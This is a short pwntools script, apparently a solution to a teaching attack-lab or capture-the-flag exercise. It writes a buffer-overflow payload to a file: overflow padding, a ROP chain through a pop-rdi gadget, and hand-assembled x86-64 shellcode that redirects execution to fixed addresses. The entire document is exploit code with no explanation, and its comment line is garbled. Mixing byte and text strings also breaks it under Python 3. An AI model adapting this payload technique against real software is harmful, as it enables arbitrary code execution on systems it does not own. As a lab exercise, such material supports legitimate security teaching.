from pwn import *
#1ç©¿3
pop_rdi=0x4029F9
layout=b"\x61"*0x28+p64(pop_rdi)+p64(0x55586000)+p64(0x4017AF)+p64(0)*5+p64(0x55586000)+'\n'
shellcode=b"\x48\xC7\xC0\xE8\x40\x60\x00\xC7\x00\x1A\x60\x58\x55\x48\xC7\xC0\xA0\x4A\x60\x00\xC7\x00\x00\x00\x00\x00\x48\xC7\xC0\xA0\x4A\x60\x00\x83\x38\x01\x74\x17\x83\x38\x02\x74\x2B\x48\xC7\xC2\xA0\x4A\x60\x00\xFF\x02\x48\xC7\xC0\xC0\x17\x40\x00\xFF\xE0\x48\xC7\xC7\xFA\x97\xB9\x59\x48\xC7\xC2\xA0\x4A\x60\x00\xFF\x02\x48\xC7\xC0\xEC\x17\x40\x00\xFF\xE0\x48\xC7\xC0\xB0\x4A\x60\x00\xC7\x00\x35\x39\x62\x39\x48\x83\xC0\x04\xC7\x00\x39\x37\x66\x61\x48\xC7\xC0\xE8\x40\x60\x00\xC7\x00\x46\x0E\x40\x00\x48\xC7\xC7\xB0\x4A\x60\x00\x48\xC7\xC0\xFA\x18\x40\x00\xFF\xE0"+'\n'
exp_f=open("./exp","wb")
exp_f.write(layout+shellcode)
exp_f.close()
